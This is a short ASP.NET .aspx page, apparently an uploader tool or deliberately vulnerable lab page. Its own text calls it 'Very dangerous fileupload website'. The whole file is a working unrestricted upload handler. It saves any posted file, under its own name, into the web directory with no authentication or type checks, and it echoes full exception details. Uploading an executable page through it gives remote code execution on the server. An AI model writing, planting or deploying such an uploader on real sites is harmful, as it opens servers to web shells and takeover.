<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
	public string test = "Very dangerous fileupload website";
    public bool fileUploaded = false;
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            
            if (Request.Params["operation"] != null)
            {
                if (Request.Params["operation"] == "upload")
                {
                    Response.Write(this.UploadFile());
                }
                else
                {
                    Response.Write("Unknown operation");
                }
            }
           
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        }
    }
   
    private string UploadFile()
    {
        try
        {
            
            
            if (Request.Files[0].FileName == "")
            {
                return "No file selected";
            }
            HttpPostedFile httpPostedFile = Request.Files[0];
            int fileLength = httpPostedFile.ContentLength;
            byte[] buffer = new byte[fileLength];
            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }
			fileUploaded = true;
            return "File uploaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
	
	public string showText(string toshow)
	{
		if(!fileUploaded)
		{
			string temp = "Very stupid file upload website<br>";
			temp += "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
			temp += "<br>";
			temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
			temp += "<div><input type=\"submit\" value=\"Send\"></div>";
			temp += "</form>";
			return temp; 
		}
		else
		{
			return "";
		}
		
	}
	

</script>

<html>
<head>
	<title>filesystembrowser</title>
	<style type="text/css">
	</style>
</head>
<body>
<% =showText(test) %>

</body>
</html>